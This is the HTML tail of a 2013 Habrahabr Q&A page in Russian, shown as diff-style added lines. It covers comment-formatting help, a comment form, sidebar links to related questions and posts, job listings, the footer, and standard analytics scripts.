+										&lt;acronym title=&quot;&quot; &gt;&lt;/acronym&gt;
+									</dt>
+	
+									<dd class="description">Тегом &lt;abbr&gt; выделяется аббревиатура, в атрибуте title указывайте её расшифровку. Используйте тег &lt;acronym&gt; для устоявшихся аббревиатур.</dd>
+								</dl>
+								<dl class="block_semi">
+									<dt>
+										&lt;pre&gt;&lt;/pre&gt;
+	
+									</dt>
+									<dd class="description">Текст в теге &lt;pre&gt; не форматируется автоматически.</dd>
+								</dl>
+								<dl class="block_semi">
+									<dt>
+										&lt;nobr&gt;&lt;/nobr&gt;<br/>
+	
+										&lt;br clear="all|left||right" /&gt;
+									</dt>
+									<dd class="description">Текст, помещенный в тег &lt;nobr&gt;, не переносится на странице; для принудительного переноса текста используйте тег &lt;br /&gt;; для аккуратного выравнивания изображений используйте атрибут clear="all|left||right" в теге &lt;br /&gt;.</dd>
+								</dl>
+								
+								<dl class="block_semi">
+									<dt>
+										&lt;ul&gt;&lt;/ul&gt;<br/>
+										&lt;li&gt;&lt;/li&gt;
+									</dt>
+									<dd class="description">Ненумерованный список; каждый элемент списка задается тегом &lt;li&gt;, набор элементов списка помещайте в тег &lt;ul&gt;.</dd>
+	
+								</dl>
+								<dl class="block_semi">
+									<dt>
+										&lt;ol&gt;&lt;/ol&gt;<br/>
+										&lt;li&gt;&lt;/li&gt;
+									</dt>
+									<dd class="description">Нумерованный список; каждый элемент списка задается тегом &lt;li&gt;, набор элементов списка помещайте в тег &lt;ol&gt;.</dd>
+	
+								</dl>
+							</td>
+						</tr>
+	
+					</table>
+					
+					<div class="close_html"><a href="#html_help_close" onclick="$(this).parents('.wysiwyg_wrapper').find('.help_holder').toggleClass('hidden');return false;">закрыть</a></div>
+					
+		</div>
+</div>
+		  </div>
+		  <div class="text-holder">
+		   <textarea cols="30" rows="10" name="text" id="text"></textarea>
+		  </div>
+		  <span id="error_text" class="error"></span>
+	</div>
+	<div class="buttons">
+		<input type="button" class="preview" value="Предпросмотр" onclick="comment_preview(this.form, this)">
+		<input type="button" class="submit" value="Написать" onclick="comment_send(this.form, this)">
+		<input type="button" class="edit hidden" value="Сохранить" onclick="answer_update(this.form, this)">
+		<input type="button" class="edit_comment hidden" value="Сохранить" onclick="comment_update(this.form, this)">
+		<span class="time_left" title="Оставшееся время редактирования комментария"></span>
+	</div>
+</form>
+
+
+			
+<form action="/json/favorites/" method="post" id="edit_tags_form" class="hidden">
+  <input type="hidden" name="action" value="add" />
+  <input type="hidden" name="ti" value="0" />
+  <input type="hidden" name="tt" value="0" />
+  <label>Пометьте топик понятными вам метками, если хотите</label>
+  <input type="text" name="tags_string" class="tags_string" />
+  <div class="description">Метки лучше разделять запятой. Например: <i>общение, социальные сети, myspace.com, подростки, мердок</i></div>
+  <input type="submit" value="Сохранить" class="submit" /> или <a href="#" class="close" onclick="return close_edit_tags()">закрыть</a>
+</form>
+
+
+    </div>
+  </div>
+  <div class="sidebar_right">
+	    	
+		<div class="banner_300x500">
+		<!--  AdRiver code START. Type:AjaxJS Site: habrahabr PZ: 0 BN: 1 -->
+		<div id="adriver_banner_1863387959"></div>
+		<script type="text/javascript">
+		new adriver("adriver_banner_1863387959", {sid:176776, bt:52, bn:1});
+		</script>
+		<!--  AdRiver code END  -->
+		</div>
+	
+	
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+			
+
+<div class="block similar_questions">
+	<div class="title">Похожие вопросы</div>
+
+	<div class="posts_list">
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/10352/">Есть ли стандарт, регламентирующие обязательные требования для обеспечения  безопасности  web приложений (сайтов)</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/44340/">Аудит безопасности сайта</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/42122/">Веб-сайт — законы, стандарты</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/3088/">Безопасная вставка видео в текст записи</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/31565/">Кто отвечает за безопасность интернет-проекта и какие проводят действия по данным инцидентам?</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/33751/">Каким образом малвари попадают на сайт?</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/41488/">монетизация сайта</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/38909/">Настройка DNS регистратора к сайту на Amazon S3</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/36225/">Сайты, тупо возвращающие ответ?</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/34933/">Веб-сайт без использования серверной технологии</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/32137/">Почему сайт может «моргать» при переходе по ссылкам?</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/31283/">Эффективность рекламы сайта в метро</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/30173/">Почему сайт пингуется, но не открывается?</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/29917/">Текстуальная версия сайта и SEO</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/27007/">Как организовать прием платежей на сайте?</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/24713/">Nginx и два сайта на одном домене</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/24140/">Своя иконка сайта для safari iOS 6</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/23179/">Какие одностраничные сайты приложений вы знаете?</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/21076/">Сайт сравнения и тестов - ноутбуков и планшетов - потерял..</a>
+      </div>
+    	<div class="post_item">
+    				<a class="post_name" href="/qa/18707/">Полностью передрали сайт, как можно закрыть копию?</a>
+      </div>
+  </div>			
+		
+</div>
+
+			
+<div class="block daily_best_posts">
+  <div class="title">Лучшее <sup>за 24 часа</sup></div>
+  <div class="posts_list">
+      <div class="post_item">
+        
+				
+				
+				
+				
+				
+
+        <a href="http://habrahabr.ru/post/189328/" class="post_name">Воронежец заключил с банком договор, внеся свои правки, и собирается отсудить 24 миллиона рублей</a>
+      </div>
+      <div class="post_item">
+        
+				
+				
+				
+				
+				
+
+        <a href="http://habrahabr.ru/post/189040/" class="post_name">Ищите ошибки с помощью Google или «взлом» аккаунтов на badoo.com</a>
+      </div>
+      <div class="post_item">
+        
+				
+				
+				
+				
+				
+
+        <a href="http://habrahabr.ru/post/189226/" class="post_name">Число Данбара и пользователи ВКонтакте</a>
+      </div>
+      <div class="post_item">
+        
+				
+				
+				
+				
+				
+
+        <a href="http://habrahabr.ru/post/189268/" class="post_name">Каверзные сетевые вопросы</a>
+      </div>
+      <div class="post_item">
+        
+				
+				
+				
+				
+				
+
+        <a href="http://habrahabr.ru/post/189274/" class="post_name">Первые жертвы закона №187 — Турбофильм и Рутор</a>
+      </div>
+      <div class="post_item">
+        
+				
+				
+				
+				
+				
+
+        <a href="http://habrahabr.ru/post/189232/" class="post_name">CyanogenMod 10.1 — Полный обзор</a>
+      </div>
+      <div class="post_item">
+        
+				
+				
+				
+				
+				
+
+        <a href="http://habrahabr.ru/post/189252/" class="post_name">Проблемы CSS. Часть 2</a>
+      </div>
+      <div class="post_item">
+        
+				
+				
+				
+				
+				
+
+        <a href="http://habrahabr.ru/post/189250/" class="post_name">Samsung представила 3D-память, Crossbar заявила о прорыве в RRAM</a>
+      </div>
+      <div class="post_item">
+        
+				
+				
+				
+				
+				
+
+        <a href="http://habrahabr.ru/post/189266/" class="post_name">Dissent — протокол анонимной связи малых закрытых сообществ</a>
+      </div>
+      <div class="post_item">
+        
+				
+				
+				
+				
+				
+
+        <a href="http://habrahabr.ru/company/yandex/blog/189032/" class="post_name">DKIM в Яндекс.Почте для доменов — как развивается безопасность электронной почты</a>
+      </div>
+  </div>
+  <div class="all"><a href="/top/">все лучшие</a></div>
+</div>
+
+			
+	<div class="block new_vacanies">
+  <a href="http://hantim.ru" class="title">Хантим</a>
+  <div class="vacancies">
+		<div class="job_item ">
+			<a href="http://hantim.ru/jobs/8255-html-verstalschik">HTML-верстальщик</a>&nbsp;&rarr; <a href="http://odnoklassniki.hantim.ru/jobs" class="company_name">Одноклассники</a>
+		</div>
+		<div class="job_item ">
+			<a href="http://hantim.ru/jobs/19748-perl-programmist">Perl-программист</a>
+		</div>
+		<div class="job_item ">
+			<a href="http://hantim.ru/jobs/21862-front-end-razrabotchik">Front-end разработчик</a>
+		</div>
+		<div class="job_item ">
+			<a href="http://hantim.ru/jobs/20274-veduschiy-inzhener-po-servernomu-oborudovaniyu-i-virtualizatsii">Ведущий инженер по серверному оборудованию и виртуализации</a>&nbsp;&rarr; <a href="http://openv.hantim.ru/jobs" class="company_name">Open Vision</a>
+		</div>
+		<div class="job_item ">
+			<a href="http://hantim.ru/jobs/20196-glavnyy-buhgalter">Главный бухгалтер</a>&nbsp;&rarr; <a href="http://openv.hantim.ru/jobs" class="company_name">Open Vision</a>
+		</div>
+		<div class="job_item ">
+			<a href="http://hantim.ru/jobs/21850-testirovschik-mobilnyh-prilozheniy">Тестировщик мобильных приложений</a>
+		</div>
+		<div class="job_item ">
+			<a href="http://hantim.ru/jobs/21018-junior-web-testirovschik">Junior WEB-Тестировщик</a>&nbsp;&rarr; <a href="http://multiship.hantim.ru/jobs" class="company_name">MultiShip</a>
+		</div>
+		<div class="job_item ">
+			<a href="http://hantim.ru/jobs/21014-junior-php-programmist">Junior PHP-программист</a>&nbsp;&rarr; <a href="http://multiship.hantim.ru/jobs" class="company_name">MultiShip</a>
+		</div>
+		<div class="job_item ">
+			<a href="http://hantim.ru/jobs/21278-veduschiy-programmist-java-i-c">Ведущий программист Java и C++</a>&nbsp;&rarr; <a href="http://Kavanga.hantim.ru/jobs" class="company_name">Каванга! </a>
+		</div>
+		<div class="job_item ">
+			<a href="http://hantim.ru/jobs/21478-php-programmist">PHP программист</a>&nbsp;&rarr; <a href="http://itar-tass.hantim.ru/jobs" class="company_name">ИТАР-ТАСС</a>
+		</div>
+  </div>
+  <div class="all"><a href="http://hantim.ru/">все вакансии</a></div>
+</div>
+
+			
+	<div class="block freelansim">
+	  <a href="http://freelansim.ru" class="title"></a>
+	  <div class="tasks">
+				<div class="task ">
+					<a href="http://freelansim.ru/tasks/32530">Редактирование шаблона сайта на Joomla</a>
+				</div>
+				<div class="task ">
+					<a href="http://freelansim.ru/tasks/32526">Редактирование сайта на Joomla</a>
+				</div>
+				<div class="task ">
+					<a href="http://freelansim.ru/tasks/32524">Разработка сайта</a>
+				</div>
+				<div class="task ">
+					<a href="http://freelansim.ru/tasks/32522">Требуется копирайтер новостей автотематики</a>
+				</div>
+				<div class="task ">
+					<a href="http://freelansim.ru/tasks/32520">From Excel 2007 to 2010</a>
+				</div>
+				<div class="task marked">
+					<a href="http://freelansim.ru/tasks/32404">Web разработчика ищем мы</a>
+				</div>
+				<div class="task ">
+					<a href="http://freelansim.ru/tasks/32518">Обложка на Facebook и vkontakte</a>
+				</div>
+				<div class="task ">
+					<a href="http://freelansim.ru/tasks/32468">Баннеры</a>
+				</div>
+				<div class="task ">
+					<a href="http://freelansim.ru/tasks/32514">Разработка "грибного" лого для mesh-сети</a>
+				</div>
+				<div class="task ">
+					<a href="http://freelansim.ru/tasks/32512">Прототип мобильного приложения</a>
+				</div>
+
+	  </div>
+	  <div class="all"><a href="http://freelansim.ru/tasks">все заказы</a></div>
+	</div>
+
+			
+  </div>
+  <div class="clear"></div>
+
+				
+	<div class="rotated_posts">
+			<div class="rotated_post ">
+				<a href="http://habrahabr.ru/post/185410/" class="grey">Fakebook. Концепт здравомыслия</a>
+			</div>
+			<div class="rotated_post ">
+				<a href="http://habrahabr.ru/post/186490/" class="grey">Роскомнадзор планирует блокировать ресурсы с информацией о заблокированных ресурсах</a>
+			</div>
+			<div class="rotated_post last">
+				<a href="http://habrahabr.ru/post/172731/" class="grey">Вертикальная черта, затем ноль</a>
+			</div>
+	</div>
+
+		  <div id="footer">
+			<dl>
+				<dd><a href="http://habrahabr.ru/login/">Войти</a></dd>
+				<dd><a href="http://habrahabr.ru/register/">Регистрация</a></dd>
+			</dl>
+			<dl>
+				<dt>Разделы</dt>
+
+				<dd><a href="http://habrahabr.ru/qa/">Q&A</a></dd>
+				<dd><a href="http://habrahabr.ru/hubs/">Хабы</a></dd>
+				<dd><a href="http://habrahabr.ru/events/">События</a></dd>
+				<dd><a href="http://habrahabr.ru/companies/">Компании</a></dd>
+				<dd><a href="http://habrahabr.ru/users/">Пользователи</a></dd>
+			</dl>
+			<dl>
+				<dt>Посты</dt>
+				
+				<dd><a href="http://habrahabr.ru/posts/top/">Лучшие</a></dd>
+				<dd><a href="http://habrahabr.ru/posts/collective/">Тематические</a></dd>
+				<dd><a href="http://habrahabr.ru/posts/corporative/">Корпоративные</a></dd>
+				<dd><a href="http://habrahabr.ru/sandbox/">Песочница</a></dd>
+			</dl>
+			<dl>
+				<dt>Инфо</dt>
+				<dd><a href="http://habrahabr.ru/info/about/">О сайте</a></dd>
+				<dd><a href="http://habrahabr.ru/info/help/rules/">Правила</a></dd>
+				<dd><a href="http://habrahabr.ru/info/help/">Помощь</a></dd>
+				<dd><a href="http://habrahabr.ru/info/agreement/">Соглашение</a></dd>
+				<dd><a href="http://habrahabr.ru/info/stats/">Статистика</a></dd>
+			</dl>
+			<dl>
+				<dt>Услуги</dt>
+				<dd><a href="http://habrahabr.ru/info/advertising/">Реклама</a></dd>
+				<dd><a href="http://habrahabr.ru/info/advertising/corporate/">Корпоративные тарифы</a></dd>
+				<dd><a href="http://habrahabr.ru/info/advertising/workshops/">Семинары</a></dd>
+				<dd><a href="http://habrahabr.ru/special/">Спецпроекты</a></dd>
+			</dl>
+      <div class="copyright">
+
+    		<div class="about">
+    		  <a class="footer_logo" href="http://thematicmedia.ru/">Тематические Медиа</a>
+    			© 2006&#8211;2013
+			<br><br>
+			<a href="/feedback/">Служба поддержки</a><br><br>
+			<a href="http://m.habrahabr.ru">Мобильная версия</a><br><br>
+			
+			
+			<div class="social_accounts">
+				<a href="https://twitter.com/habrahabr" class="tw"></a>
+				<a href="https://www.facebook.com/habrahabr.ru" class="fb"></a>
+				<a href="http://vk.com/habr" class="vk"></a>
+				<!-- <a href="" class="gp"></a> //-->
+			</div>
+			
+		</div>
+      </div>
+
+</div>
+
+		</div>
+
+		
+    
+		
+		
+    <script type="text/javascript">
+      $(document).ready(function(){
+        // test gggg
+        // настройки всплывающих уведомлений
+        $.jGrowl.defaults.closerTemplate = '<div>Закрыть все уведомления</div>';         
+        
+        // настройки тултипов
+        $(".help-tip").tipTip({maxWidth: "300px", edgeOffset: 10});  
+        
+      });
+      // global vars
+      var g_base_url = 'habrahabr.ru';
+      var g_show_xpanel = false;
+      var g_base_fullurl = 'http://habrahabr.ru/';
+      var g_is_guest = false;
+    </script>
+		
+    <script type="text/javascript" src="/javascripts/1375881678/_parts/shortcuts.js"></script>
+		<script type="text/javascript" src="/javascripts/1375881678/_parts/to_top.js"></script>
+		<link href="/styles/1375881678/_parts/_to_top.css" rel="stylesheet" media="all" />
+
+		
+		<script type="text/javascript" src="/javascripts/1375881678/_parts/float_block.js"></script>
+		
+		<!-- <script type="text/javascript" src="/javascripts/1375881678/_parts/float_block.js"></script> //-->
+			<!-- Yandex.Metrika counter -->
+<script type="text/javascript">
+(function (d, w, c) {
+    (w[c] = w[c] || []).push(function() {
+        try {
+            w.yaCounter19919284 = new Ya.Metrika({id:19919284,
+                    webvisor:true,
+                    clickmap:true,
+                    trackLinks:true,
+                    accurateTrackBounce:true});
+        } catch(e) { }
+    });
+
+    var n = d.getElementsByTagName("script")[0],
+        s = d.createElement("script"),
+        f = function () { n.parentNode.insertBefore(s, n); };
+    s.type = "text/javascript";
+    s.async = true;
+    s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
+
+    if (w.opera == "[object Opera]") {
+        d.addEventListener("DOMContentLoaded", f, false);
+    } else { f(); }
+})(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="//mc.yandex.ru/watch/19919284" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+
+<script type="text/javascript">
+	/*<![CDATA[*/
+	var ga = document.createElement('script');
+		ga.setAttribute('async', 'true');
+		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+	/* ]]>*/
+</script>
+
+<script type="text/javascript">
+	var _gaq = _gaq || [];
+	_gaq.push(
+	    ['_setAccount', 'UA-726094-1'],
+	    ['_setDomainName', '.habrahabr.ru'],
+	    ["_addOrganic", "mail.ru", "q"],
+	    ["_addOrganic","rambler.ru", "words"],
+	    ["_addOrganic","nigma.ru", "s"],
+	    ["_addOrganic","blogs.yandex.ru", "text"],
+	    ["_addOrganic","webalta.ru", "q"],
+	    ["_addOrganic","aport.ru", "r"],
+	    ["_addOrganic","akavita.by", "z"],
+	    ["_addOrganic","meta.ua", "q"],
+	    ["_addOrganic","bigmir.net", "q"],
+	    ["_addOrganic","tut.by", "query"],
+	    ["_addOrganic","all.by", "query"],
+	    ["_addOrganic","i.ua", "q"],
+	    ["_addOrganic","online.ua", "q"],
+	    ["_addOrganic","a.ua", "s"],
+	    ["_addOrganic","ukr.net", "search_query"],
+	    ["_addOrganic","search.com.ua", "q"],
+	    ["_addOrganic","search.ua", "query"],
+	    ["_addOrganic","poisk.ru", "text"],
+	    ["_addOrganic","km.ru", "sq"],
+	    ["_addOrganic","liveinternet.ru", "ask"],
+	    ["_addOrganic","gogo.ru", "q"],
+	    ["_addOrganic","gde.ru", "keywords"],
+	    ["_addOrganic","quintura.ru", "request"],
+	    ['_trackPageview']
+	);
+	document.documentElement.firstChild.appendChild(ga);
+</script>	
+
+		<script type="text/javascript" src="/javascripts/1375881678/advertising.js"></script>
+			<script type="text/javascript" src="http://habrahabr.ru/viewcount/qa/44688/"></script>
+
+		
+		<div class="footer_logos">
+		
+		<div class="project brainstorage">
+			<a href="http://brainstorage.ru" class="icon "></a>
+			<div class="text">Все мозги в одном месте</div>
+		</div>
+
+		<div class="project freelansim">
+			<a href="http://freelansim.ru" class="icon "></a>
+			<div class="text">Заказы для фрилансеров</div>
+		</div>
+		
+		
+		<div class="project hantim">
+			<a href="http://hantim.ru" class="icon "></a>
+			<div class="text">Вакансии для айтишников</div>
+		</div>
+		
+		<div class="project autokadabra">
+			<a href="http://autokadabra.ru" class="icon "></a>
+			<div class="text ">Уютная и дружелюбная</div>
+		</div>
+		
+</div>		
+		
+		
+	</body>
+</html>
